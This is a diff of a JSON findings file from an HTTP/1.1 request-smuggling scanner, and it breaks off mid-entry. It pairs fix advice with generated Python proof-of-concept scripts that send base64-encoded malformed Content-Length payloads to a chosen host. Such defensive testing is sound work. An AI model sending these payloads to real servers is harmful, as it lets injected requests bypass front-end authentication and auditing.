@@ -31,13 +31,28 @@
       "left": "ref-cl-first",
       "right": "ref-lenient-cl",
       "axis": "cl_value",
+      "domain": "http1-framing",
       "impact": "前置与后端对『这条请求到哪里结束』判断不同：前置转发的字节里，后端只消费了一部分，剩下的成为后端眼中**下一条请求**的开头。于是攻击者可以在前置完全看不见的情况下，向后端注入一条自选请求 —— 前置的鉴权、限流、审计对这条被夹带的请求全部失效。",
       "fix": "对 CL 与 TE 并存、非规范 CL、冲突 CL、TE 终编码非 chunked 的请求一律 400 拒绝；上游必须在转发前完成定帧并重写为规范形式",
       "evidence": "移除请求头 `Content-Length: 03` —— 分歧消失，说明它由攻击者可直接发送的部分承载",
       "chain_desc": "若 **ref-cl-first → ref-lenient-cl** 串联：前置转发 39 字节，后端只消费 0 字节 → **39 字节被夹带**，将成为下一条请求的开头",
-      "forwarded": 39,
-      "back_consumed": 0,
-      "smuggled_len": 39,
+      "quant": {
+        "label": "被夹带字节数",
+        "describe": "若 **ref-cl-first → ref-lenient-cl** 串联：前置转发 39 字节，后端只消费 0 字节 → **39 字节被夹带**，将成为下一条请求的开头",
+        "values": {
+          "front": "ref-cl-first",
+          "back": "ref-lenient-cl",
+          "forwarded": "39",
+          "back_consumed": "0",
+          "smuggled": "39"
+        },
+        "numbers": [
+          39,
+          0,
+          39
+        ],
+        "verified": true
+      },
       "verified": true,
       "original_len": 59,
       "sample_len": 42,
@@ -50,7 +65,7 @@
         "紧随其后的下一条请求会被拼接在那 39 字节之后，被夹带的字节成为后端眼中另一条请求的开头",
         "修复：对 CL 与 TE 并存、非规范 CL、冲突 CL、TE 终编码非 chunked 的请求一律 400 拒绝；上游必须在转发前完成定帧并重写为规范形式"
       ],
-      "script": "#!/usr/bin/env python3\n\"\"\"请求走私（HTTP/1.1 消息边界分歧）\n\n由 CED 自动生成 —— 用例 8b2611d2，场景 desync。\n零第三方依赖；放在仓库任意位置都能跑（脚本会自己往上找仓库根目录）。\n\n    python poc_8b2611d2.py                      # 离线：算清字节归属（默认，不联网）\n    python poc_8b2611d2.py --send 127.0.0.1:8080 --i-am-authorized\n                                            # 真的把最小复现样本发出去（仅限已授权目标）\n\n合规：--send 必须同时给出 --i-am-authorized。只对自有或已授权的目标使用。\n\"\"\"\nfrom __future__ import annotations\n\nimport argparse\nimport base64\nimport socket\nimport sys\nfrom pathlib import Path\n\n\ndef _find_root() -> Path:\n    \"\"\"往上找带 ced/__init__.py 的目录 —— 脚本被挪到哪儿都能跑。\"\"\"\n    here = Path(__file__).resolve()\n    for parent in here.parents:\n        if (parent / \"ced\" / \"__init__.py\").is_file():\n            return parent\n    return here.parent\n\n\nROOT = _find_root()\nif str(ROOT) not in sys.path:\n    sys.path.insert(0, str(ROOT))\n\nfrom ced.impls import reference                      # noqa: E402\nfrom ced.orchestrate.chain import chain_evidence     # noqa: E402\n\nCASE_ID = '8b2611d2'\nFRONT = 'ref-cl-first'\nBACK = 'ref-lenient-cl'\nPAYLOAD = base64.b64decode('UE9TVCAvIEhUVFAvMS4xDQpDb250ZW50LUxlbmd0aDogMDMNCg0KYWJj')\nEXPECT = (39, 0, 39)\n\n\ndef accounting() -> tuple[int, int, int] | None:\n    \"\"\"用两侧的分帧策略算出：前置转发多少 / 后端消费多少 / 夹带多少。\"\"\"\n    try:\n        front_policy = reference.policy_of(FRONT)\n        back_policy = reference.policy_of(BACK)\n    except KeyError:\n        return None\n    ev = chain_evidence(PAYLOAD, front_policy, back_policy, FRONT, BACK)\n    return ev.forwarded, ev.back_consumed, ev.smuggled_len\n\n\ndef main() -> int:\n    ap = argparse.ArgumentParser(description=\"CED 生成的复现脚本\")\n    ap.add_argument(\"--send\", metavar=\"HOST:PORT\",\n                    help=\"把最小复现样本真的发到这个地址（前置入口）\")\n    ap.add_argument(\"--i-am-authorized\", action=\"store_true\",\n                    help=\"确认对 --send 的目标已获授权；缺此项则拒绝发送\")\n    args = ap.parse_args()\n\n    print(f\"用例        {CASE_ID}\")\n    print(f\"链路        {FRONT} → {BACK}\")\n    print(f\"样本长度    {len(PAYLOAD)} 字节\")\n\n    got = accounting()\n    if got is None:\n        print(\"字节归属    无法量化（两侧含非本地实现）—— 请在真实拓扑上复现\")\n    else:\n        forwarded, consumed, smuggled = got\n        print(f\"前置转发    {forwarded} 字节\")\n        print(f\"后端消费    {consumed} 字节\")\n        print(f\"被夹带      {smuggled} 字节\")\n        if EXPECT[0] is not None:\n            ok = got == EXPECT\n            print(f\"断言        {'PASS' if ok else 'FAIL'}（期望 {EXPECT}）\")\n            if not ok:\n                print(\"说明        期望值来自生成时的实现；不一致说明复现条件已变，\")\n                print(\"            请重新跑一次 scan 生成新的 PoC，而不是改期望值。\")\n\n    if args.send:\n        if not args.i_am_authorized:\n            print(\"拒绝发送：--send 需要同时给出 --i-am-authorized\"\n                  \"（只对自有或已授权目标使用）。\")\n            return 2\n        host, _, port = args.send.rpartition(\":\")\n        with socket.create_connection((host or \"127.0.0.1\", int(port)), timeout=10) as sock:\n            sock.sendall(PAYLOAD)\n            sock.shutdown(socket.SHUT_WR)\n            response = b\"\"\n            while True:\n                chunk = sock.recv(65536)\n                if not chunk:\n                    break\n                response += chunk\n        print(f\"已发送      {args.send}，收到 {len(response)} 字节响应\")\n        print(\"提示        走私的效果要看**下一条请求**，单次发送看不到；\"\n              \"请在后端日志或探针视角里确认被夹带的字节。\")\n    return 0\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())\n",
+      "script": "#!/usr/bin/env python3\n\"\"\"请求走私（HTTP/1.1 消息边界分歧）\n\n由 CED 自动生成 —— 用例 8b2611d2，场景 desync，领域 http1-framing。\n零第三方依赖；放在仓库任意位置都能跑（脚本会自己往上找仓库根目录）。\n\n    python poc_8b2611d2.py                      # 离线：算清量化指标（默认，不联网）\n    python poc_8b2611d2.py --send HOST:PORT --i-am-authorized\n                                            # 真的把最小复现样本发出去（仅限已授权目标）\n\n合规：--send 必须同时给出 --i-am-authorized。只对自有或已授权的目标使用。\n\"\"\"\nfrom __future__ import annotations\n\nimport argparse\nimport base64\nimport socket\nimport sys\nfrom pathlib import Path\n\n\ndef _find_root() -> Path:\n    \"\"\"往上找带 ced/__init__.py 的目录 —— 脚本被挪到哪儿都能跑。\"\"\"\n    here = Path(__file__).resolve()\n    for parent in here.parents:\n        if (parent / \"ced\" / \"__init__.py\").is_file():\n            return parent\n    return here.parent\n\n\nROOT = _find_root()\nif str(ROOT) not in sys.path:\n    sys.path.insert(0, str(ROOT))\n\nfrom ced.impls import reference\nfrom ced.orchestrate.chain import chain_evidence\n\nCASE_ID = '8b2611d2'\nFRONT = 'ref-cl-first'\nBACK = 'ref-lenient-cl'\nPAYLOAD = base64.b64decode('UE9TVCAvIEhUVFAvMS4xDQpDb250ZW50LUxlbmd0aDogMDMNCg0KYWJj')\nEXPECT = (39, 0, 39)\n\n\ndef measure():\n    \"\"\"按两侧的策略算出量化指标。算不出来返回 None。\"\"\"\n    try:\n        front_policy = reference.policy_of(FRONT)\n        back_policy = reference.policy_of(BACK)\n    except KeyError:\n        return None\n    ev = chain_evidence(PAYLOAD, front_policy, back_policy, FRONT, BACK)\n    return ev.forwarded, ev.back_consumed, ev.smuggled_len\n\n\ndef main() -> int:\n    ap = argparse.ArgumentParser(description=\"CED 生成的复现脚本\")\n    ap.add_argument(\"--send\", metavar=\"HOST:PORT\",\n                    help=\"把最小复现样本真的发到这个地址（前置入口）\")\n    ap.add_argument(\"--i-am-authorized\", action=\"store_true\",\n                    help=\"确认对 --send 的目标已获授权；缺此项则拒绝发送\")\n    args = ap.parse_args()\n\n    print(f\"用例        {CASE_ID}\")\n    print(f\"链路        {FRONT} → {BACK}\")\n    print(f\"样本长度    {len(PAYLOAD)} 字节\")\n\n    got = measure()\n    ok = got is not None\n    if got is None:\n        print(\"量化        无法计算（两侧含非本地实现）—— 请在真实拓扑上复现\")\n    else:\n        forwarded, consumed, smuggled = got\n        print(f\"前置转发    {forwarded} 字节\")\n        print(f\"后端消费    {consumed} 字节\")\n        print(f\"被夹带      {smuggled} 字节\")\n        if EXPECT[0] is not None:\n            ok = got == tuple(EXPECT)\n            print(f\"断言        {'PASS' if ok else 'FAIL'}（期望 {EXPECT}）\")\n\n    if args.send:\n        if not args.i_am_authorized:\n            print(\"拒绝发送：--send 需要同时给出 --i-am-authorized\"\n                  \"（只对自有或已授权目标使用）。\")\n            return 2\n        host, _, port = args.send.rpartition(\":\")\n        with socket.create_connection((host or \"127.0.0.1\", int(port)), timeout=10) as sock:\n            sock.sendall(PAYLOAD)\n            sock.shutdown(socket.SHUT_WR)\n            response = b\"\"\n            while True:\n                chunk = sock.recv(65536)\n                if not chunk:\n                    break\n                response += chunk\n        print(f\"已发送      {args.send}，收到 {len(response)} 字节响应\")\n    return 0 if ok else 1\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())\n",
       "file_name": "poc_8b2611d2.py"
     },
     {
@@ -62,13 +77,28 @@
       "left": "ref-cl-first",
       "right": "ref-lenient-cl",
       "axis": "cl_value",
+      "domain": "http1-framing",
       "impact": "前置与后端对『这条请求到哪里结束』判断不同：前置转发的字节里，后端只消费了一部分，剩下的成为后端眼中**下一条请求**的开头。于是攻击者可以在前置完全看不见的情况下，向后端注入一条自选请求 —— 前置的鉴权、限流、审计对这条被夹带的请求全部失效。",
       "fix": "对 CL 与 TE 并存、非规范 CL、冲突 CL、TE 终编码非 chunked 的请求一律 400 拒绝；上游必须在转发前完成定帧并重写为规范形式",
       "evidence": "移除请求头 `Content-Length: +3` —— 分歧消失，说明它由攻击者可直接发送的部分承载",
       "chain_desc": "若 **ref-cl-first → ref-lenient-cl** 串联：前置转发 39 字节，后端只消费 0 字节 → **39 字节被夹带**，将成为下一条请求的开头",
-      "forwarded": 39,
-      "back_consumed": 0,
-      "smuggled_len": 39,
+      "quant": {
+        "label": "被夹带字节数",
+        "describe": "若 **ref-cl-first → ref-lenient-cl** 串联：前置转发 39 字节，后端只消费 0 字节 → **39 字节被夹带**，将成为下一条请求的开头",
+        "values": {
+          "front": "ref-cl-first",
+          "back": "ref-lenient-cl",
+          "forwarded": "39",
+          "back_consumed": "0",
+          "smuggled": "39"
+        },
+        "numbers": [
+          39,
+          0,
+          39
+        ],
+        "verified": true
+      },
       "verified": true,
       "original_len": 59,
       "sample_len": 42,
@@ -81,7 +111,7 @@
         "紧随其后的下一条请求会被拼接在那 39 字节之后，被夹带的字节成为后端眼中另一条请求的开头",
         "修复：对 CL 与 TE 并存、非规范 CL、冲突 CL、TE 终编码非 chunked 的请求一律 400 拒绝；上游必须在转发前完成定帧并重写为规范形式"
       ],
-      "script": "#!/usr/bin/env python3\n\"\"\"请求走私（HTTP/1.1 消息边界分歧）\n\n由 CED 自动生成 —— 用例 d1df52a0，场景 desync。\n零第三方依赖；放在仓库任意位置都能跑（脚本会自己往上找仓库根目录）。\n\n    python poc_d1df52a0.py                      # 离线：算清字节归属（默认，不联网）\n    python poc_d1df52a0.py --send 127.0.0.1:8080 --i-am-authorized\n                                            # 真的把最小复现样本发出去（仅限已授权目标）\n\n合规：--send 必须同时给出 --i-am-authorized。只对自有或已授权的目标使用。\n\"\"\"\nfrom __future__ import annotations\n\nimport argparse\nimport base64\nimport socket\nimport sys\nfrom pathlib import Path\n\n\ndef _find_root() -> Path:\n    \"\"\"往上找带 ced/__init__.py 的目录 —— 脚本被挪到哪儿都能跑。\"\"\"\n    here = Path(__file__).resolve()\n    for parent in here.parents:\n        if (parent / \"ced\" / \"__init__.py\").is_file():\n            return parent\n    return here.parent\n\n\nROOT = _find_root()\nif str(ROOT) not in sys.path:\n    sys.path.insert(0, str(ROOT))\n\nfrom ced.impls import reference                      # noqa: E402\nfrom ced.orchestrate.chain import chain_evidence     # noqa: E402\n\nCASE_ID = 'd1df52a0'\nFRONT = 'ref-cl-first'\nBACK = 'ref-lenient-cl'\nPAYLOAD = base64.b64decode('UE9TVCAvIEhUVFAvMS4xDQpDb250ZW50LUxlbmd0aDogKzMNCg0KYWJj')\nEXPECT = (39, 0, 39)\n\n\ndef accounting() -> tuple[int, int, int] | None:\n    \"\"\"用两侧的分帧策略算出：前置转发多少 / 后端消费多少 / 夹带多少。\"\"\"\n    try:\n        front_policy = reference.policy_of(FRONT)\n        back_policy = reference.policy_of(BACK)\n    except KeyError:\n        return None\n    ev = chain_evidence(PAYLOAD, front_policy, back_policy, FRONT, BACK)\n    return ev.forwarded, ev.back_consumed, ev.smuggled_len\n\n\ndef main() -> int:\n    ap = argparse.ArgumentParser(description=\"CED 生成的复现脚本\")\n    ap.add_argument(\"--send\", metavar=\"HOST:PORT\",\n                    help=\"把最小复现样本真的发到这个地址（前置入口）\")\n    ap.add_argument(\"--i-am-authorized\", action=\"store_true\",\n                    help=\"确认对 --send 的目标已获授权；缺此项则拒绝发送\")\n    args = ap.parse_args()\n\n    print(f\"用例        {CASE_ID}\")\n    print(f\"链路        {FRONT} → {BACK}\")\n    print(f\"样本长度    {len(PAYLOAD)} 字节\")\n\n    got = accounting()\n    if got is None:\n        print(\"字节归属    无法量化（两侧含非本地实现）—— 请在真实拓扑上复现\")\n    else:\n        forwarded, consumed, smuggled = got\n        print(f\"前置转发    {forwarded} 字节\")\n        print(f\"后端消费    {consumed} 字节\")\n        print(f\"被夹带      {smuggled} 字节\")\n        if EXPECT[0] is not None:\n            ok = got == EXPECT\n            print(f\"断言        {'PASS' if ok else 'FAIL'}（期望 {EXPECT}）\")\n            if not ok:\n                print(\"说明        期望值来自生成时的实现；不一致说明复现条件已变，\")\n                print(\"            请重新跑一次 scan 生成新的 PoC，而不是改期望值。\")\n\n    if args.send:\n        if not args.i_am_authorized:\n            print(\"拒绝发送：--send 需要同时给出 --i-am-authorized\"\n                  \"（只对自有或已授权目标使用）。\")\n            return 2\n        host, _, port = args.send.rpartition(\":\")\n        with socket.create_connection((host or \"127.0.0.1\", int(port)), timeout=10) as sock:\n            sock.sendall(PAYLOAD)\n            sock.shutdown(socket.SHUT_WR)\n            response = b\"\"\n            while True:\n                chunk = sock.recv(65536)\n                if not chunk:\n                    break\n                response += chunk\n        print(f\"已发送      {args.send}，收到 {len(response)} 字节响应\")\n        print(\"提示        走私的效果要看**下一条请求**，单次发送看不到；\"\n              \"请在后端日志或探针视角里确认被夹带的字节。\")\n    return 0\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())\n",
+      "script": "#!/usr/bin/env python3\n\"\"\"请求走私（HTTP/1.1 消息边界分歧）\n\n由 CED 自动生成 —— 用例 d1df52a0，场景 desync，领域 http1-framing。\n零第三方依赖；放在仓库任意位置都能跑（脚本会自己往上找仓库根目录）。\n\n    python poc_d1df52a0.py                      # 离线：算清量化指标（默认，不联网）\n    python poc_d1df52a0.py --send HOST:PORT --i-am-authorized\n                                            # 真的把最小复现样本发出去（仅限已授权目标）\n\n合规：--send 必须同时给出 --i-am-authorized。只对自有或已授权的目标使用。\n\"\"\"\nfrom __future__ import annotations\n\nimport argparse\nimport base64\nimport socket\nimport sys\nfrom pathlib import Path\n\n\ndef _find_root() -> Path:\n    \"\"\"往上找带 ced/__init__.py 的目录 —— 脚本被挪到哪儿都能跑。\"\"\"\n    here = Path(__file__).resolve()\n    for parent in here.parents:\n        if (parent / \"ced\" / \"__init__.py\").is_file():\n            return parent\n    return here.parent\n\n\nROOT = _find_root()\nif str(ROOT) not in sys.path:\n    sys.path.insert(0, str(ROOT))\n\nfrom ced.impls import reference\nfrom ced.orchestrate.chain import chain_evidence\n\nCASE_ID = 'd1df52a0'\nFRONT = 'ref-cl-first'\nBACK = 'ref-lenient-cl'\nPAYLOAD = base64.b64decode('UE9TVCAvIEhUVFAvMS4xDQpDb250ZW50LUxlbmd0aDogKzMNCg0KYWJj')\nEXPECT = (39, 0, 39)\n\n\ndef measure():\n    \"\"\"按两侧的策略算出量化指标。算不出来返回 None。\"\"\"\n    try:\n        front_policy = reference.policy_of(FRONT)\n        back_policy = reference.policy_of(BACK)\n    except KeyError:\n        return None\n    ev = chain_evidence(PAYLOAD, front_policy, back_policy, FRONT, BACK)\n    return ev.forwarded, ev.back_consumed, ev.smuggled_len\n\n\ndef main() -> int:\n    ap = argparse.ArgumentParser(description=\"CED 生成的复现脚本\")\n    ap.add_argument(\"--send\", metavar=\"HOST:PORT\",\n                    help=\"把最小复现样本真的发到这个地址（前置入口）\")\n    ap.add_argument(\"--i-am-authorized\", action=\"store_true\",\n                    help=\"确认对 --send 的目标已获授权；缺此项则拒绝发送\")\n    args = ap.parse_args()\n\n    print(f\"用例        {CASE_ID}\")\n    print(f\"链路        {FRONT} → {BACK}\")\n    print(f\"样本长度    {len(PAYLOAD)} 字节\")\n\n    got = measure()\n    ok = got is not None\n    if got is None:\n        print(\"量化        无法计算（两侧含非本地实现）—— 请在真实拓扑上复现\")\n    else:\n        forwarded, consumed, smuggled = got\n        print(f\"前置转发    {forwarded} 字节\")\n        print(f\"后端消费    {consumed} 字节\")\n        print(f\"被夹带      {smuggled} 字节\")\n        if EXPECT[0] is not None:\n            ok = got == tuple(EXPECT)\n            print(f\"断言        {'PASS' if ok else 'FAIL'}（期望 {EXPECT}）\")\n\n    if args.send:\n        if not args.i_am_authorized:\n            print(\"拒绝发送：--send 需要同时给出 --i-am-authorized\"\n                  \"（只对自有或已授权目标使用）。\")\n            return 2\n        host, _, port = args.send.rpartition(\":\")\n        with socket.create_connection((host or \"127.0.0.1\", int(port)), timeout=10) as sock:\n            sock.sendall(PAYLOAD)\n            sock.shutdown(socket.SHUT_WR)\n            response = b\"\"\n            while True:\n                chunk = sock.recv(65536)\n                if not chunk:\n                    break\n                response += chunk\n        print(f\"已发送      {args.send}，收到 {len(response)} 字节响应\")\n    return 0 if ok else 1\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())\n",
       "file_name": "poc_d1df52a0.py"
     },
     {
@@ -93,13 +123,28 @@
       "left": "ref-cl-first",
       "right": "ref-lenient-cl",
       "axis": "cl_value",
+      "domain": "http1-framing",
       "impact": "前置与后端对『这条请求到哪里结束』判断不同：前置转发的字节里，后端只消费了一部分，剩下的成为后端眼中**下一条请求**的开头。于是攻击者可以在前置完全看不见的情况下，向后端注入一条自选请求 —— 前置的鉴权、限流、审计对这条被夹带的请求全部失效。",
       "fix": "对 CL 与 TE 并存、非规范 CL、冲突 CL、TE 终编码非 chunked 的请求一律 400 拒绝；上游必须在转发前完成定帧并重写为规范形式",
       "evidence": "移除请求头 `Content-Length: 0000003` —— 分歧消失，说明它由攻击者可直接发送的部分承载",
       "chain_desc": "若 **ref-cl-first → ref-lenient-cl** 串联：前置转发 44 字节，后端只消费 0 字节 → **44 字节被夹带**，将成为下一条请求的开头",
-      "forwarded": 44,
-      "back_consumed": 0,
-      "smuggled_len": 44,
+      "quant": {
+        "label": "被夹带字节数",
+        "describe": "若 **ref-cl-first → ref-lenient-cl** 串联：前置转发 44 字节，后端只消费 0 字节 → **44 字节被夹带**，将成为下一条请求的开头",
+        "values": {
+          "front": "ref-cl-first",
+          "back": "ref-lenient-cl",
+          "forwarded": "44",
+          "back_consumed": "0",
+          "smuggled": "44"
+        },
+        "numbers": [
+          44,
+          0,
+          44
+        ],
+        "verified": true
+      },
       "verified": true,
       "original_len": 64,
       "sample_len": 47,
@@ -112,7 +157,7 @@
         "紧随其后的下一条请求会被拼接在那 44 字节之后，被夹带的字节成为后端眼中另一条请求的开头",
         "修复：对 CL 与 TE 并存、非规范 CL、冲突 CL、TE 终编码非 chunked 的请求一律 400 拒绝；上游必须在转发前完成定帧并重写为规范形式"
       ],
-      "script": "#!/usr/bin/env python3\n\"\"\"请求走私（HTTP/1.1 消息边界分歧）\n\n由 CED 自动生成 —— 用例 44f044fe，场景 desync。\n零第三方依赖；放在仓库任意位置都能跑（脚本会自己往上找仓库根目录）。\n\n    python poc_44f044fe.py                      # 离线：算清字节归属（默认，不联网）\n    python poc_44f044fe.py --send 127.0.0.1:8080 --i-am-authorized\n                                            # 真的把最小复现样本发出去（仅限已授权目标）\n\n合规：--send 必须同时给出 --i-am-authorized。只对自有或已授权的目标使用。\n\"\"\"\nfrom __future__ import annotations\n\nimport argparse\nimport base64\nimport socket\nimport sys\nfrom pathlib import Path\n\n\ndef _find_root() -> Path:\n    \"\"\"往上找带 ced/__init__.py 的目录 —— 脚本被挪到哪儿都能跑。\"\"\"\n    here = Path(__file__).resolve()\n    for parent in here.parents:\n        if (parent / \"ced\" / \"__init__.py\").is_file():\n            return parent\n    return here.parent\n\n\nROOT = _find_root()\nif str(ROOT) not in sys.path:\n    sys.path.insert(0, str(ROOT))\n\nfrom ced.impls import reference                      # noqa: E402\nfrom ced.orchestrate.chain import chain_evidence     # noqa: E402\n\nCASE_ID = '44f044fe'\nFRONT = 'ref-cl-first'\nBACK = 'ref-lenient-cl'\nPAYLOAD = base64.b64decode('UE9TVCAvIEhUVFAvMS4xDQpDb250ZW50LUxlbmd0aDogMDAwMDAwMw0KDQphYmM=')\nEXPECT = (44, 0, 44)\n\n\ndef accounting() -> tuple[int, int, int] | None:\n    \"\"\"用两侧的分帧策略算出：前置转发多少 / 后端消费多少 / 夹带多少。\"\"\"\n    try:\n        front_policy = reference.policy_of(FRONT)\n        back_policy = reference.policy_of(BACK)\n    except KeyError:\n        return None\n    ev = chain_evidence(PAYLOAD, front_policy, back_policy, FRONT, BACK)\n    return ev.forwarded, ev.back_consumed, ev.smuggled_len\n\n\ndef main() -> int:\n    ap = argparse.ArgumentParser(description=\"CED 生成的复现脚本\")\n    ap.add_argument(\"--send\", metavar=\"HOST:PORT\",\n                    help=\"把最小复现样本真的发到这个地址（前置入口）\")\n    ap.add_argument(\"--i-am-authorized\", action=\"store_true\",\n                    help=\"确认对 --send 的目标已获授权；缺此项则拒绝发送\")\n    args = ap.parse_args()\n\n    print(f\"用例        {CASE_ID}\")\n    print(f\"链路        {FRONT} → {BACK}\")\n    print(f\"样本长度    {len(PAYLOAD)} 字节\")\n\n    got = accounting()\n    if got is None:\n        print(\"字节归属    无法量化（两侧含非本地实现）—— 请在真实拓扑上复现\")\n    else:\n        forwarded, consumed, smuggled = got\n        print(f\"前置转发    {forwarded} 字节\")\n        print(f\"后端消费    {consumed} 字节\")\n        print(f\"被夹带      {smuggled} 字节\")\n        if EXPECT[0] is not None:\n            ok = got == EXPECT\n            print(f\"断言        {'PASS' if ok else 'FAIL'}（期望 {EXPECT}）\")\n            if not ok:\n                print(\"说明        期望值来自生成时的实现；不一致说明复现条件已变，\")\n                print(\"            请重新跑一次 scan 生成新的 PoC，而不是改期望值。\")\n\n    if args.send:\n        if not args.i_am_authorized:\n            print(\"拒绝发送：--send 需要同时给出 --i-am-authorized\"\n                  \"（只对自有或已授权目标使用）。\")\n            return 2\n        host, _, port = args.send.rpartition(\":\")\n        with socket.create_connection((host or \"127.0.0.1\", int(port)), timeout=10) as sock:\n            sock.sendall(PAYLOAD)\n            sock.shutdown(socket.SHUT_WR)\n            response = b\"\"\n            while True:\n                chunk = sock.recv(65536)\n                if not chunk:\n                    break\n                response += chunk\n        print(f\"已发送      {args.send}，收到 {len(response)} 字节响应\")\n        print(\"提示        走私的效果要看**下一条请求**，单次发送看不到；\"\n              \"请在后端日志或探针视角里确认被夹带的字节。\")\n    return 0\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())\n",
+      "script": "#!/usr/bin/env python3\n\"\"\"请求走私（HTTP/1.1 消息边界分歧）\n\n由 CED 自动生成 —— 用例 44f044fe，场景 desync，领域 http1-framing。\n零第三方依赖；放在仓库任意位置都能跑（脚本会自己往上找仓库根目录）。\n\n    python poc_44f044fe.py                      # 离线：算清量化指标（默认，不联网）\n    python poc_44f044fe.py --send HOST:PORT --i-am-authorized\n                                            # 真的把最小复现样本发出去（仅限已授权目标）\n\n合规：--send 必须同时给出 --i-am-authorized。只对自有或已授权的目标使用。\n\"\"\"\nfrom __future__ import annotations\n\nimport argparse\nimport base64\nimport socket\nimport sys\nfrom pathlib import Path\n\n\ndef _find_root() -> Path:\n    \"\"\"往上找带 ced/__init__.py 的目录 —— 脚本被挪到哪儿都能跑。\"\"\"\n    here = Path(__file__).resolve()\n    for parent in here.parents:\n        if (parent / \"ced\" / \"__init__.py\").is_file():\n            return parent\n    return here.parent\n\n\nROOT = _find_root()\nif str(ROOT) not in sys.path:\n    sys.path.insert(0, str(ROOT))\n\nfrom ced.impls import reference\nfrom ced.orchestrate.chain import chain_evidence\n\nCASE_ID = '44f044fe'\nFRONT = 'ref-cl-first'\nBACK = 'ref-lenient-cl'\nPAYLOAD = base64.b64decode('UE9TVCAvIEhUVFAvMS4xDQpDb250ZW50LUxlbmd0aDogMDAwMDAwMw0KDQphYmM=')\nEXPECT = (44, 0, 44)\n\n\ndef measure():\n    \"\"\"按两侧的策略算出量化指标。算不出来返回 None。\"\"\"\n    try:\n        front_policy = reference.policy_of(FRONT)\n        back_policy = reference.policy_of(BACK)\n    except KeyError:\n        return None\n    ev = chain_evidence(PAYLOAD, front_policy, back_policy, FRONT, BACK)\n    return ev.forwarded, ev.back_consumed, ev.smuggled_len\n\n\ndef main() -> int:\n    ap = argparse.ArgumentParser(description=\"CED 生成的复现脚本\")\n    ap.add_argument(\"--send\", metavar=\"HOST:PORT\",\n                    help=\"把最小复现样本真的发到这个地址（前置入口）\")\n    ap.add_argument(\"--i-am-authorized\", action=\"store_true\",\n                    help=\"确认对 --send 的目标已获授权；缺此项则拒绝发送\")\n    args = ap.parse_args()\n\n    print(f\"用例        {CASE_ID}\")\n    print(f\"链路        {FRONT} → {BACK}\")\n    print(f\"样本长度    {len(PAYLOAD)} 字节\")\n\n    got = measure()\n    ok = got is not None\n    if got is None:\n        print(\"量化        无法计算（两侧含非本地实现）—— 请在真实拓扑上复现\")\n    else:\n        forwarded, consumed, smuggled = got\n        print(f\"前置转发    {forwarded} 字节\")\n        print(f\"后端消费    {consumed} 字节\")\n        print(f\"被夹带      {smuggled} 字节\")\n        if EXPECT[0] is not None:\n            ok = got == tuple(EXPECT)\n            print(f\"断言        {'PASS' if ok else 'FAIL'}（期望 {EXPECT}）\")\n\n    if args.send:\n        if not args.i_am_authorized:\n            print(\"拒绝发送：--send 需要同时给出 --i-am-authorized\"\n                  \"（只对自有或已授权目标使用）。\")\n            return 2\n        host, _, port = args.send.rpartition(\":\")\n        with socket.create_connection((host or \"127.0.0.1\", int(port)), timeout=10) as sock:\n            sock.sendall(PAYLOAD)\n            sock.shutdown(socket.SHUT_WR)\n            response = b\"\"\n            while True:\n                chunk = sock.recv(65536)\n                if not chunk:\n                    break\n                response += chunk\n        print(f\"已发送      {args.send}，收到 {len(response)} 字节响应\")\n    return 0 if ok else 1\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())\n",
       "file_name": "poc_44f044fe.py"
     },
     {
@@ -124,13 +169,28 @@
       "left": "ref-cl-first",
       "right": "ref-lenient-cl",
       "axis": "cl_value",
+      "domain": "http1-framing",
       "impact": "前置与后端对『这条请求到哪里结束』判断不同：前置转发的字节里，后端只消费了一部分，剩下的成为后端眼中**下一条请求**的开头。于是攻击者可以在前置完全看不见的情况下，向后端注入一条自选请求 —— 前置的鉴权、限流、审计对这条被夹带的请求全部失效。",
       "fix": "对 CL 与 TE 并存、非规范 CL、冲突 CL、TE 终编码非 chunked 的请求一律 400 拒绝；上游必须在转发前完成定帧并重写为规范形式",
       "evidence": "移除请求头 `CONTENT-LENGTH: +3` —— 分歧消失，说明它由攻击者可直接发送的部分承载",
       "chain_desc": "若 **ref-cl-first → ref-lenient-cl** 串联：前置转发 39 字节，后端只消费 0 字节 → **39 字节被夹带**，将成为下一条请求的开头",
-      "forwarded": 39,
-      "back_consumed": 0,
-      "smuggled_len": 39,
+      "quant": {
+        "label": "被夹带字节数",
+        "describe": "若 **ref-cl-first → ref-lenient-cl** 串联：前置转发 39 字节，后端只消费 0 字节 → **39 字节被夹带**，将成为下一条请求的开头",
+        "values": {
+          "front": "ref-cl-first",
+          "back": "ref-lenient-cl",
+          "forwarded": "39",
+          "back_consumed": "0",
+          "smuggled": "39"
+        },
+        "numbers": [
+          39,
+          0,
+          39
+        ],
+        "verified": true
+      },
       "verified": true,
       "original_len": 59,
       "sample_len": 42,
@@ -143,7 +203,7 @@
         "紧随其后的下一条请求会被拼接在那 39 字节之后，被夹带的字节成为后端眼中另一条请求的开头",
         "修复：对 CL 与 TE 并存、非规范 CL、冲突 CL、TE 终编码非 chunked 的请求一律 400 拒绝；上游必须在转发前完成定帧并重写为规范形式"
       ],
-      "script": "#!/usr/bin/env python3\n\"\"\"请求走私（HTTP/1.1 消息边界分歧）\n\n由 CED 自动生成 —— 用例 3d0a4b5b，场景 desync。\n零第三方依赖；放在仓库任意位置都能跑（脚本会自己往上找仓库根目录）。\n\n    python poc_3d0a4b5b.py                      # 离线：算清字节归属（默认，不联网）\n    python poc_3d0a4b5b.py --send 127.0.0.1:8080 --i-am-authorized\n                                            # 真的把最小复现样本发出去（仅限已授权目标）\n\n合规：--send 必须同时给出 --i-am-authorized。只对自有或已授权的目标使用。\n\"\"\"\nfrom __future__ import annotations\n\nimport argparse\nimport base64\nimport socket\nimport sys\nfrom pathlib import Path\n\n\ndef _find_root() -> Path:\n    \"\"\"往上找带 ced/__init__.py 的目录 —— 脚本被挪到哪儿都能跑。\"\"\"\n    here = Path(__file__).resolve()\n    for parent in here.parents:\n        if (parent / \"ced\" / \"__init__.py\").is_file():\n            return parent\n    return here.parent\n\n\nROOT = _find_root()\nif str(ROOT) not in sys.path:\n    sys.path.insert(0, str(ROOT))\n\nfrom ced.impls import reference                      # noqa: E402\nfrom ced.orchestrate.chain import chain_evidence     # noqa: E402\n\nCASE_ID = '3d0a4b5b'\nFRONT = 'ref-cl-first'\nBACK = 